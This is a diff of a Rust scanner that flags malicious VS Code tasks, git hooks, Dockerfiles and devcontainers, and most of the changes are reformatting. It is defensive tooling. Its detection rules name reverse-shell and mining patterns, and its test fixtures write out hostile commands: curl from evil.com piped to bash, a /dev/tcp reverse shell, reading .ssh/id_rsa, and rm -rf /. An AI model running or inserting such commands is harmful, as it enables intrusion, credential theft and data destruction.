-        (r"(?i)RUN\s+.*\b(nc|ncat|netcat)\b.*-[elp]", Severity::Critical, "Dockerfile RUN with netcat reverse shell"),
-        (r"(?i)RUN\s+.*/dev/tcp/", Severity::Critical, "Dockerfile RUN with /dev/tcp (reverse shell)"),
-        (r"(?i)RUN\s+.*\bbase64\s+(-d|--decode)", Severity::High, "Dockerfile RUN decodes base64"),
-        (r"(?i)RUN\s+.*\beval\b", Severity::High, "Dockerfile RUN uses eval"),
-        (r"(?i)RUN\s+.*\bchmod\s+\+[sx]\b", Severity::Medium, "Dockerfile RUN sets executable/setuid permissions"),
-        (r"(?i)RUN\s+.*\bchmod\s+[0-7]*[4-7][0-7]{2}\b", Severity::Low, "Dockerfile RUN modifies permissions"),
-
+        (
+            r"(?i)RUN\s+.*\b(nc|ncat|netcat)\b.*-[elp]",
+            Severity::Critical,
+            "Dockerfile RUN with netcat reverse shell",
+        ),
+        (
+            r"(?i)RUN\s+.*/dev/tcp/",
+            Severity::Critical,
+            "Dockerfile RUN with /dev/tcp (reverse shell)",
+        ),
+        (
+            r"(?i)RUN\s+.*\bbase64\s+(-d|--decode)",
+            Severity::High,
+            "Dockerfile RUN decodes base64",
+        ),
+        (
+            r"(?i)RUN\s+.*\beval\b",
+            Severity::High,
+            "Dockerfile RUN uses eval",
+        ),
+        (
+            r"(?i)RUN\s+.*\bchmod\s+\+[sx]\b",
+            Severity::Medium,
+            "Dockerfile RUN sets executable/setuid permissions",
+        ),
+        (
+            r"(?i)RUN\s+.*\bchmod\s+[0-7]*[4-7][0-7]{2}\b",
+            Severity::Low,
+            "Dockerfile RUN modifies permissions",
+        ),
         // Crypto mining
-        (r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining)", Severity::Critical, "Dockerfile references crypto mining"),
-
+        (
+            r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining)",
+            Severity::Critical,
+            "Dockerfile references crypto mining",
+        ),
         // Privileged / security-sensitive
-        (r"(?i)^USER\s+root\s*$", Severity::Medium, "Dockerfile runs as root"),
-        (r"(?i)--mount=type=secret", Severity::High, "Dockerfile mounts build secrets"),
-        (r"(?i)--mount=type=ssh", Severity::High, "Dockerfile mounts SSH agent"),
-        (r"(?i)^VOLUME\s+", Severity::Low, "Dockerfile declares VOLUME"),
-
+        (
+            r"(?i)^USER\s+root\s*$",
+            Severity::Medium,
+            "Dockerfile runs as root",
+        ),
+        (
+            r"(?i)--mount=type=secret",
+            Severity::High,
+            "Dockerfile mounts build secrets",
+        ),
+        (
+            r"(?i)--mount=type=ssh",
+            Severity::High,
+            "Dockerfile mounts SSH agent",
+        ),
+        (
+            r"(?i)^VOLUME\s+",
+            Severity::Low,
+            "Dockerfile declares VOLUME",
+        ),
         // Suspicious FROM
-        (r"(?i)^FROM\s+.*(latest|:master|:main)\s*$", Severity::Medium, "Dockerfile FROM uses mutable tag (latest/main)"),
-
+        (
+            r"(?i)^FROM\s+.*(latest|:master|:main)\s*$",
+            Severity::Medium,
+            "Dockerfile FROM uses mutable tag (latest/main)",
+        ),
         // Environment manipulation
-        (r#"(?i)^ENV\s+(PATH|LD_PRELOAD|LD_LIBRARY_PATH|HOME)\s*="#, Severity::Medium, "Dockerfile overrides sensitive ENV variable"),
-
+        (
+            r#"(?i)^ENV\s+(PATH|LD_PRELOAD|LD_LIBRARY_PATH|HOME)\s*="#,
+            Severity::Medium,
+            "Dockerfile overrides sensitive ENV variable",
+        ),
         // Persistence / cron in container
-        (r"(?i)RUN\s+.*\bcrontab\b", Severity::High, "Dockerfile installs crontab (persistence)"),
-        (r"(?i)RUN\s+.*\bsystemctl\b", Severity::Medium, "Dockerfile uses systemctl in build"),
+        (
+            r"(?i)RUN\s+.*\bcrontab\b",
+            Severity::High,
+            "Dockerfile installs crontab (persistence)",
+        ),
+        (
+            r"(?i)RUN\s+.*\bsystemctl\b",
+            Severity::Medium,
+            "Dockerfile uses systemctl in build",
+        ),
     ];
 
     rules
@@ -1249,7 +1826,7 @@ fn analyze_dockerfile(path: &Path, content: &str, findings: &mut Vec<Finding>) {
 
 /// Dangerous devcontainer lifecycle commands (run automatically).
 const DEVCONTAINER_LIFECYCLE_COMMANDS: &[(&str, Severity)] = &[
-    ("initializeCommand", Severity::Critical),   // Runs on HOST before container
+    ("initializeCommand", Severity::Critical), // Runs on HOST before container
     ("onCreateCommand", Severity::High),
     ("updateContentCommand", Severity::High),
     ("postCreateCommand", Severity::High),
@@ -1259,13 +1836,37 @@ const DEVCONTAINER_LIFECYCLE_COMMANDS: &[(&str, Severity)] = &[
 
 /// Dangerous Docker run arguments.
 const DANGEROUS_RUN_ARGS: &[(&str, Severity, &str)] = &[
-    ("--privileged", Severity::Critical, "Container runs in privileged mode (full host access)"),
+    (
+        "--privileged",
+        Severity::Critical,
+        "Container runs in privileged mode (full host access)",
+    ),
     ("--net=host", Severity::High, "Container uses host network"),
-    ("--network=host", Severity::High, "Container uses host network"),
-    ("--pid=host", Severity::High, "Container shares host PID namespace"),
-    ("--ipc=host", Severity::Medium, "Container shares host IPC namespace"),
-    ("--cap-add", Severity::High, "Container adds Linux capabilities"),
-    ("-v /:/", Severity::Critical, "Container mounts host root filesystem"),
+    (
+        "--network=host",
+        Severity::High,
+        "Container uses host network",
+    ),
+    (
+        "--pid=host",
+        Severity::High,
+        "Container shares host PID namespace",
+    ),
+    (
+        "--ipc=host",
+        Severity::Medium,
+        "Container shares host IPC namespace",
+    ),
+    (
+        "--cap-add",
+        Severity::High,
+        "Container adds Linux capabilities",
+    ),
+    (
+        "-v /:/",
+        Severity::Critical,
+        "Container mounts host root filesystem",
+    ),
     ("--device", Severity::High, "Container accesses host device"),
 ];
 
@@ -1356,25 +1957,23 @@ fn strip_jsonc_comments(input: &str) -> String {
 fn extract_lifecycle_commands(val: &serde_json::Value) -> Vec<String> {
     match val {
         serde_json::Value::String(s) => vec![s.clone()],
-        serde_json::Value::Array(arr) => {
-            arr.iter()
-                .filter_map(|v| v.as_str().map(String::from))
-                .collect()
-        }
-        serde_json::Value::Object(obj) => {
-            obj.values()
-                .filter_map(|v| match v {
-                    serde_json::Value::String(s) => Some(vec![s.clone()]),
-                    serde_json::Value::Array(arr) => Some(
-                        arr.iter()
-                            .filter_map(|v| v.as_str().map(String::from))
-                            .collect(),
-                    ),
-                    _ => None,
-                })
-                .flatten()
-                .collect()
-        }
+        serde_json::Value::Array(arr) => arr
+            .iter()
+            .filter_map(|v| v.as_str().map(String::from))
+            .collect(),
+        serde_json::Value::Object(obj) => obj
+            .values()
+            .filter_map(|v| match v {
+                serde_json::Value::String(s) => Some(vec![s.clone()]),
+                serde_json::Value::Array(arr) => Some(
+                    arr.iter()
+                        .filter_map(|v| v.as_str().map(String::from))
+                        .collect(),
+                ),
+                _ => None,
+            })
+            .flatten()
+            .collect(),
         _ => Vec::new(),
     }
 }
@@ -1455,17 +2054,29 @@ fn analyze_devcontainer_value(
                 _ => continue,
             };
 
-            if mount_str.contains("/etc") || mount_str.contains("/root") || mount_str.starts_with("/:/") {
+            if mount_str.contains("/etc")
+                || mount_str.contains("/root")
+                || mount_str.starts_with("/:/")
+            {
                 findings.push(Finding::new(
                     Severity::Critical,
                     &file_str,
-                    &format!("devcontainer mounts sensitive host path: {}", truncate(&mount_str, 100)),
+                    &format!(
+                        "devcontainer mounts sensitive host path: {}",
+                        truncate(&mount_str, 100)
+                    ),
                 ));
-            } else if mount_str.contains("$HOME") || mount_str.contains("${localEnv:HOME}") || mount_str.contains(".ssh") {
+            } else if mount_str.contains("$HOME")
+                || mount_str.contains("${localEnv:HOME}")
+                || mount_str.contains(".ssh")
+            {
                 findings.push(Finding::new(
                     Severity::High,
                     &file_str,
-                    &format!("devcontainer mounts home/ssh directory: {}", truncate(&mount_str, 100)),
+                    &format!(
+                        "devcontainer mounts home/ssh directory: {}",
+                        truncate(&mount_str, 100)
+                    ),
                 ));
             } else {
                 findings.push(Finding::new(
@@ -1521,7 +2132,9 @@ fn analyze_devcontainer_value(
                         &file_str,
                         &format!(
                             "devcontainer {} overrides {}: {}",
-                            env_field, key, truncate(val_str, 80),
+                            env_field,
+                            key,
+                            truncate(val_str, 80),
                         ),
                     ));
                 }
@@ -1532,7 +2145,10 @@ fn analyze_devcontainer_value(
                             &file_str,
                             &format!(
                                 "devcontainer {} {}: {} in value: {}",
-                                env_field, key, rule.description, truncate(val_str, 80),
+                                env_field,
+                                key,
+                                rule.description,
+                                truncate(val_str, 80),
                             ),
                         ));
                     }
@@ -1562,7 +2178,10 @@ fn scan_docker_and_devcontainer(root: &Path, verbose: bool) -> Vec<Finding> {
 
         // Skip node_modules, .git, target
         let path_str = entry.path().display().to_string();
-        if path_str.contains("node_modules/") || path_str.contains("/.git/") || path_str.contains("/target/") {
+        if path_str.contains("node_modules/")
+            || path_str.contains("/.git/")
+            || path_str.contains("/target/")
+        {
             continue;
         }
 
@@ -1717,8 +2336,7 @@ fn run_semgrep(root: &Path) -> Vec<Finding> {
     if !is_tool_available("semgrep") {
         println!(
             "  {}",
-            "semgrep not found on PATH, skipping. Install: pip install semgrep"
-                .yellow()
+            "semgrep not found on PATH, skipping. Install: pip install semgrep".yellow()
         );
         return Vec::new();
     }
@@ -1728,12 +2346,15 @@ fn run_semgrep(root: &Path) -> Vec<Finding> {
     let output = Command::new("semgrep")
         .args([
             "scan",
-            "--config", "p/security-audit",
-            "--config", "p/secrets",
+            "--config",
+            "p/security-audit",
+            "--config",
+            "p/secrets",
             "--json",
             "--quiet",
             "--no-git-ignore",
-            "--timeout", "30",
+            "--timeout",
+            "30",
         ])
         .arg(root)
         .output();
@@ -1815,10 +2436,7 @@ fn parse_osv_json(json_str: &str) -> Vec<Finding> {
             };
 
             for vuln in vulns {
-                let vuln_id = vuln
-                    .get("id")
-                    .and_then(|i| i.as_str())
-                    .unwrap_or("unknown");
+                let vuln_id = vuln.get("id").and_then(|i| i.as_str()).unwrap_or("unknown");
                 let summary = vuln
                     .get("summary")
                     .and_then(|s| s.as_str())
@@ -1826,11 +2444,7 @@ fn parse_osv_json(json_str: &str) -> Vec<Finding> {
                 let aliases: Vec<&str> = vuln
                     .get("aliases")
                     .and_then(|a| a.as_array())
-                    .map(|arr| {
-                        arr.iter()
-                            .filter_map(|v| v.as_str())
-                            .collect()
-                    })
+                    .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
                     .unwrap_or_default();
 
                 // Try to extract a CVSS score from database_specific or severity
@@ -1839,13 +2453,11 @@ fn parse_osv_json(json_str: &str) -> Vec<Finding> {
                     .and_then(|s| s.as_array())
                     .and_then(|arr| {
                         arr.iter().find_map(|s| {
-                            s.get("score")
-                                .and_then(|sc| sc.as_str())
-                                .and_then(|sc| {
-                                    // CVSS vector: extract base score
-                                    // Or it might be a direct score
-                                    sc.parse::<f64>().ok()
-                                })
+                            s.get("score").and_then(|sc| sc.as_str()).and_then(|sc| {
+                                // CVSS vector: extract base score
+                                // Or it might be a direct score
+                                sc.parse::<f64>().ok()
+                            })
                         })
                     })
                     .unwrap_or(5.0); // default to medium if no score
@@ -2021,15 +2633,14 @@ fn main() {
 
     for vscode_dir in &vscode_dirs {
         scanned_anything = true;
-        println!(
-            "\n{} {}",
-            "Scanning:".bold(),
-            vscode_dir.display()
-        );
+        println!("\n{} {}", "Scanning:".bold(), vscode_dir.display());
         println!("{}", "-".repeat(60));
 
         let findings = scan_vscode_dir(vscode_dir, cli.verbose);
-        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += findings.len();
@@ -2069,7 +2680,10 @@ fn main() {
         println!("{}", "-".repeat(60));
 
         let findings = scan_git_hooks(git_root, cli.verbose);
-        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += findings.len();
@@ -2089,7 +2703,10 @@ fn main() {
         println!("{}", "-".repeat(60));
 
         let findings = scan_cargo_build_scripts(root, cli.verbose);
-        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += findings.len();
@@ -2101,19 +2718,52 @@ fn main() {
     if root.join("package.json").exists() {
         scanned_anything = true;
         npm_scanned = true;
-        println!(
-            "\n{} {} (npm packages)",
-            "Scanning:".bold(),
-            root.display()
-        );
+        println!("\n{} {} (npm packages)", "Scanning:".bold(), root.display());
         println!("{}", "-".repeat(60));
 
         let findings = scan_npm_packages(root, cli.verbose);
-        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += findings.len();
         print_findings(&findings);
+    }
+
+    // Scan build orchestration files (Makefile / npm scripts / task files)
+    let mut build_orchestration_scanned = false;
+    {
+        let has_build_orchestration = WalkDir::new(root)
+            .into_iter()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.file_type().is_file())
+            .any(|e| {
+                !should_skip_common_generated_dirs(e.path())
+                    && is_build_orchestration_file(e.path())
+            });
+
+        if has_build_orchestration {
+            scanned_anything = true;
+            build_orchestration_scanned = true;
+            println!(
+                "\n{} {} (build orchestration files)",
+                "Scanning:".bold(),
+                root.display()
+            );
+            println!("{}", "-".repeat(60));
+
+            let findings = scan_build_orchestration_files(root, cli.verbose);
+            if findings
+                .iter()
+                .any(|f| matches!(f.severity, Severity::Critical))
+            {
+                any_critical = true;
+            }
+            total_findings += findings.len();
+            print_findings(&findings);
+        }
     }
 
     // Scan Dockerfiles and .devcontainer
@@ -2127,13 +2777,17 @@ fn main() {
             .any(|e| {
                 let n = e.file_name().to_string_lossy();
                 let p = e.path().display().to_string();
-                !p.contains("node_modules/") && !p.contains("/.git/") && !p.contains("/target/")
-                    && (n.as_ref() == "Dockerfile" || n.as_ref() == "dockerfile"
+                !p.contains("node_modules/")
+                    && !p.contains("/.git/")
+                    && !p.contains("/target/")
+                    && (n.as_ref() == "Dockerfile"
+                        || n.as_ref() == "dockerfile"
                         || n.as_ref() == "Containerfile"
-                        || n.starts_with("Dockerfile.") || n.ends_with(".Dockerfile"))
+                        || n.starts_with("Dockerfile.")
+                        || n.ends_with(".Dockerfile"))
             });
-        let has_devcontainer = root.join(".devcontainer").is_dir()
-            || root.join(".devcontainer.json").exists();
+        let has_devcontainer =
+            root.join(".devcontainer").is_dir() || root.join(".devcontainer.json").exists();
 
         if has_dockerfile || has_devcontainer {
             scanned_anything = true;
@@ -2146,7 +2800,10 @@ fn main() {
             println!("{}", "-".repeat(60));
 
             let findings = scan_docker_and_devcontainer(root, cli.verbose);
-            if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+            if findings
+                .iter()
+                .any(|f| matches!(f.severity, Severity::Critical))
+            {
                 any_critical = true;
             }
             total_findings += findings.len();
@@ -2155,16 +2812,15 @@ fn main() {
     }
 
     // Run semgrep
-    println!(
-        "\n{} {} (semgrep)",
-        "Scanning:".bold(),
-        root.display()
-    );
+    println!("\n{} {} (semgrep)", "Scanning:".bold(), root.display());
     println!("{}", "-".repeat(60));
     let semgrep_findings = run_semgrep(root);
     if !semgrep_findings.is_empty() {
         scanned_anything = true;
-        if semgrep_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if semgrep_findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += semgrep_findings.len();
@@ -2174,16 +2830,15 @@ fn main() {
     }
 
     // Run osv-scanner
-    println!(
-        "\n{} {} (osv-scanner)",
-        "Scanning:".bold(),
-        root.display()
-    );
+    println!("\n{} {} (osv-scanner)", "Scanning:".bold(), root.display());
     println!("{}", "-".repeat(60));
     let osv_findings = run_osv_scanner(root);
     if !osv_findings.is_empty() {
         scanned_anything = true;
-        if osv_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+        if osv_findings
+            .iter()
+            .any(|f| matches!(f.severity, Severity::Critical))
+        {
             any_critical = true;
         }
         total_findings += osv_findings.len();
@@ -2193,7 +2848,7 @@ fn main() {
     }
 
     if !scanned_anything {
-        println!("{}", "No .vscode directory, git hooks, or Cargo.toml found, and external scanners found nothing.".yellow());
+        println!("{}", "No .vscode directory, git hooks, Cargo.toml, package.json, Makefile/task build files found, and external scanners found nothing.".yellow());
         std::process::exit(0);
     }
 
@@ -2201,18 +2856,20 @@ fn main() {
         + git_roots.len()
         + cargo_scanned as usize
         + npm_scanned as usize
+        + build_orchestration_scanned as usize
         + docker_scanned as usize
         + (!semgrep_findings.is_empty()) as usize
         + (!osv_findings.is_empty()) as usize;
     if total_scanned > 1 {
         println!("\n{}", "=== Overall Summary ===".bold());
         println!(
-            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, {} docker, semgrep, osv-scanner), {} total findings",
+            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, {} build orchestration, {} docker, semgrep, osv-scanner), {} total findings",
             total_scanned,
             vscode_dirs.len(),
             git_roots.len(),
             cargo_scanned as usize,
             npm_scanned as usize,
+            build_orchestration_scanned as usize,
             docker_scanned as usize,
             total_findings,
         );
@@ -2253,16 +2910,16 @@ mod tests {
     }
 
     fn has_description_containing(findings: &[Finding], substring: &str) -> bool {
-        findings
-            .iter()
-            .any(|f| f.description.contains(substring))
+        findings.iter().any(|f| f.description.contains(substring))
     }
 
     // ---- tasks.json tests ----
 
     #[test]
     fn tasks_run_on_folder_open_is_critical() {
-        let findings = scan_with_files(&[("tasks.json", r#"{
+        let findings = scan_with_files(&[(
+            "tasks.json",
+            r#"{
             "version": "2.0.0",
             "tasks": [{
                 "label": "setup",
@@ -2270,27 +2927,39 @@ mod tests {
                 "command": "echo hello",
                 "runOptions": { "runOn": "folderOpen" }
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "runs automatically on folder open"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on folder open"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn tasks_shell_command_is_flagged() {
-        let findings = scan_with_files(&[("tasks.json", r#"{
+        let findings = scan_with_files(&[(
+            "tasks.json",
+            r#"{
             "version": "2.0.0",
             "tasks": [{
                 "label": "build",
                 "type": "shell",
                 "command": "make build"
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "Shell/process task with command"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Shell/process task with command"
+        ));
     }
 
     #[test]
     fn tasks_curl_payload_is_critical() {
-        let findings = scan_with_files(&[("tasks.json", r#"{
+        let findings = scan_with_files(&[(
+            "tasks.json",
+            r#"{
             "version": "2.0.0",
             "tasks": [{
                 "label": "install",
@@ -2298,37 +2967,59 @@ mod tests {
                 "command": "curl http://evil.com/payload.sh | bash",
                 "runOptions": { "runOn": "folderOpen" }
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "Network download command"));
-        assert!(has_description_containing(&findings, "runs automatically on folder open"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on folder open"
+        ));
     }
 
     // ---- settings.json tests ----
 
     #[test]
     fn settings_allow_automatic_tasks_is_critical() {
-        let findings = scan_with_files(&[("settings.json", r#"{
+        let findings = scan_with_files(&[(
+            "settings.json",
+            r#"{
             "task.allowAutomaticTasks": "on"
-        }"#)]);
-        assert!(has_description_containing(&findings, "Automatic tasks explicitly allowed"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Automatic tasks explicitly allowed"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn settings_custom_shell_is_high() {
-        let findings = scan_with_files(&[("settings.json", r#"{
+        let findings = scan_with_files(&[(
+            "settings.json",
+            r#"{
             "terminal.integrated.shell.linux": "/bin/evil"
-        }"#)]);
-        assert!(has_description_containing(&findings, "Custom terminal shell path"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Custom terminal shell path"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn settings_benign_is_low_risk() {
-        let findings = scan_with_files(&[("settings.json", r#"{
+        let findings = scan_with_files(&[(
+            "settings.json",
+            r#"{
             "editor.tabSize": 4,
             "files.trimTrailingWhitespace": true
-        }"#)]);
+        }"#,
+        )]);
         assert!(!has_severity(&findings, "Critical"));
         assert!(!has_severity(&findings, "High"));
     }
@@ -2337,51 +3028,75 @@ mod tests {
 
     #[test]
     fn launch_pre_launch_task_is_flagged() {
-        let findings = scan_with_files(&[("launch.json", r#"{
+        let findings = scan_with_files(&[(
+            "launch.json",
+            r#"{
             "configurations": [{
                 "type": "node",
                 "request": "launch",
                 "name": "Run",
                 "preLaunchTask": "build"
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "references task via preLaunchTask"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "references task via preLaunchTask"
+        ));
     }
 
     #[test]
     fn launch_env_is_noted() {
-        let findings = scan_with_files(&[("launch.json", r#"{
+        let findings = scan_with_files(&[(
+            "launch.json",
+            r#"{
             "configurations": [{
                 "type": "node",
                 "request": "launch",
                 "name": "Run",
                 "env": { "SECRET": "value" }
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "sets environment variables"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "sets environment variables"
+        ));
     }
 
     // ---- extensions.json tests ----
 
     #[test]
     fn extensions_unknown_publisher_is_flagged() {
-        let findings = scan_with_files(&[("extensions.json", r#"{
+        let findings = scan_with_files(&[(
+            "extensions.json",
+            r#"{
             "recommendations": [
                 "evil-publisher.malware-ext"
             ]
-        }"#)]);
-        assert!(has_description_containing(&findings, "lesser-known publisher"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "lesser-known publisher"
+        ));
     }
 
     #[test]
     fn extensions_known_publisher_is_clean() {
-        let findings = scan_with_files(&[("extensions.json", r#"{
+        let findings = scan_with_files(&[(
+            "extensions.json",
+            r#"{
             "recommendations": [
                 "ms-python.python",
                 "rust-lang.rust-analyzer"
             ]
-        }"#)]);
-        assert!(!has_description_containing(&findings, "lesser-known publisher"));
+        }"#,
+        )]);
+        assert!(!has_description_containing(
+            &findings,
+            "lesser-known publisher"
+        ));
     }
 
     // ---- Unexpected files tests ----
@@ -2392,7 +3107,10 @@ mod tests {
             ("settings.json", "{}"),
             ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com | bash"),
         ]);
-        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: backdoor.sh"));
+        assert!(has_description_containing(
+            &findings,
+            "Unexpected file/directory in .vscode: backdoor.sh"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
@@ -2402,7 +3120,10 @@ mod tests {
             ("settings.json", "{}"),
             ("setup.bat", "@echo off\npowershell -enc AAAA"),
         ]);
-        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: setup.bat"));
+        assert!(has_description_containing(
+            &findings,
+            "Unexpected file/directory in .vscode: setup.bat"
+        ));
     }
 
     #[test]
@@ -2411,56 +3132,81 @@ mod tests {
             ("settings.json", "{}"),
             ("subdir/hidden/payload.sh", "#!/bin/bash\nrm -rf /"),
         ]);
-        assert!(has_description_containing(&findings, "Executable/script file deep in .vscode"));
+        assert!(has_description_containing(
+            &findings,
+            "Executable/script file deep in .vscode"
+        ));
     }
 
     // ---- Content pattern tests ----
 
     #[test]
     fn detects_reverse_shell_pattern() {
-        let findings = scan_with_files(&[("settings.json", r#"{
+        let findings = scan_with_files(&[(
+            "settings.json",
+            r#"{
             "note": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
-        }"#)]);
-        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "/dev/tcp redirection"
+        ));
     }
 
     #[test]
     fn detects_base64_decode() {
-        let findings = scan_with_files(&[("tasks.json", r#"{
+        let findings = scan_with_files(&[(
+            "tasks.json",
+            r#"{
             "version": "2.0.0",
             "tasks": [{
                 "label": "x",
                 "type": "shell",
                 "command": "echo aGVsbG8= | base64 --decode | bash"
             }]
-        }"#)]);
+        }"#,
+        )]);
         assert!(has_description_containing(&findings, "Base64 decode"));
     }
 
     #[test]
     fn detects_crypto_mining() {
-        let findings = scan_with_files(&[("config.txt", "pool: stratum+tcp://pool.mining.com:3333")]);
-        assert!(has_description_containing(&findings, "Crypto mining indicator"));
+        let findings =
+            scan_with_files(&[("config.txt", "pool: stratum+tcp://pool.mining.com:3333")]);
+        assert!(has_description_containing(
+            &findings,
+            "Crypto mining indicator"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn detects_sensitive_dir_reference() {
-        let findings = scan_with_files(&[("tasks.json", r#"{
+        let findings = scan_with_files(&[(
+            "tasks.json",
+            r#"{
             "version": "2.0.0",
             "tasks": [{
                 "label": "steal",
                 "type": "shell",
                 "command": "cat .ssh/id_rsa"
             }]
-        }"#)]);
-        assert!(has_description_containing(&findings, "Reference to sensitive config"));
+        }"#,
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Reference to sensitive config"
+        ));
     }
 
     #[test]
     fn detects_destructive_rm() {
         let findings = scan_with_files(&[("cleanup.sh", "rm -rf /home/user/*")]);
-        assert!(has_description_containing(&findings, "Destructive file deletion"));
+        assert!(has_description_containing(
+            &findings,
+            "Destructive file deletion"
+        ));
     }
 
     // ---- Clean directory test ----
@@ -2469,7 +3215,10 @@ mod tests {
     fn clean_vscode_has_no_critical_findings() {
         let findings = scan_with_files(&[
             ("settings.json", r#"{ "editor.tabSize": 2 }"#),
-            ("extensions.json", r#"{ "recommendations": ["ms-python.python"] }"#),
+            (
+                "extensions.json",
+                r#"{ "recommendations": ["ms-python.python"] }"#,
+            ),
         ]);
         assert!(!has_severity(&findings, "Critical"));
         assert!(!has_severity(&findings, "High"));
@@ -2480,7 +3229,9 @@ mod tests {
     #[test]
     fn full_malicious_vscode_scan() {
         let findings = scan_with_files(&[
-            ("tasks.json", r#"{
+            (
+                "tasks.json",
+                r#"{
                 "version": "2.0.0",
                 "tasks": [{
                     "label": "init",
@@ -2488,25 +3239,40 @@ mod tests {
                     "command": "curl http://evil.com/payload | bash -c 'eval $(cat)'",
                     "runOptions": { "runOn": "folderOpen" }
                 }]
-            }"#),
-            ("settings.json", r#"{
+            }"#,
+            ),
+            (
+                "settings.json",
+                r#"{
                 "task.allowAutomaticTasks": "on",
                 "terminal.integrated.shell.linux": "/bin/evil-shell"
-            }"#),
-            ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com/steal | bash"),
+            }"#,
+            ),
+            (
+                "backdoor.sh",
+                "#!/bin/bash\ncurl http://evil.com/steal | bash",
+            ),
         ]);
         let critical_count = findings
             .iter()
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
         // Expect multiple critical findings
-        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+        assert!(
+            critical_count >= 3,
+            "Expected at least 3 critical findings, got {}",
+            critical_count
+        );
     }
 
     // ---- Git hooks helpers ----
 
     /// Create a temporary repo with `.git/hooks/` and optional shared hooks, run scan, return findings.
-    fn scan_git_hooks_with(hooks: &[(&str, &str)], config: Option<&str>, shared_dir: Option<(&str, &[(&str, &str)])>) -> Vec<Finding> {
+    fn scan_git_hooks_with(
+        hooks: &[(&str, &str)],
+        config: Option<&str>,
+        shared_dir: Option<(&str, &[(&str, &str)])>,
+    ) -> Vec<Finding> {
         let dir = tempfile::tempdir().unwrap();
         let git_hooks = dir.path().join(".git").join("hooks");
         fs::create_dir_all(&git_hooks).unwrap();
@@ -2538,12 +3304,12 @@ mod tests {
 
     #[test]
     fn git_sample_hooks_are_ignored() {
-        let findings = scan_git_hooks_with(
-            &[("pre-commit.sample", "#!/bin/sh\nexit 0")],
-            None,
-            None,
+        let findings =
+            scan_git_hooks_with(&[("pre-commit.sample", "#!/bin/sh\nexit 0")], None, None);
+        assert!(
+            findings.is_empty(),
+            "Sample hooks should produce no findings"
         );
-        assert!(findings.is_empty(), "Sample hooks should produce no findings");
     }
 
     #[test]
@@ -2553,38 +3319,37 @@ mod tests {
             None,
             None,
         );
-        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on common git operations"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn git_active_post_checkout_hook_is_high() {
-        let findings = scan_git_hooks_with(
-            &[("post-checkout", "#!/bin/sh\nmake setup")],
-            None,
-            None,
-        );
-        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
+        let findings =
+            scan_git_hooks_with(&[("post-checkout", "#!/bin/sh\nmake setup")], None, None);
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on common git operations"
+        ));
     }
 
     #[test]
     fn git_active_update_hook_is_medium() {
-        let findings = scan_git_hooks_with(
-            &[("update", "#!/bin/sh\necho update")],
-            None,
-            None,
-        );
-        assert!(has_description_containing(&findings, "Active git hook 'update' present"));
+        let findings = scan_git_hooks_with(&[("update", "#!/bin/sh\necho update")], None, None);
+        assert!(has_description_containing(
+            &findings,
+            "Active git hook 'update' present"
+        ));
         assert!(has_severity(&findings, "Medium"));
     }
 
     #[test]
     fn git_unknown_hook_name_is_flagged() {
-        let findings = scan_git_hooks_with(
-            &[("not-a-real-hook", "#!/bin/sh\necho hi")],
-            None,
-            None,
-        );
